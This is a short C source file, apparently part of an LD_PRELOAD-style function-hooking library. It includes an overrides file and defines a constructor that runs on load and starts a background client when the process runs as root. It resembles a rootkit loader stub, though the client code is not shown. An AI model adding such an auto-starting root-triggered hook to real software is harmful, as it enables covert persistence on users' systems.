#include <unistd.h>
#include "util.h"
#include "overrides.c"

// TODO: add x64 function overrides

void __attribute__((constructor)) init(void)
{
    if (getuid() == 0 && !client_running()) start_client();
    // do that on all hooked funcs
}
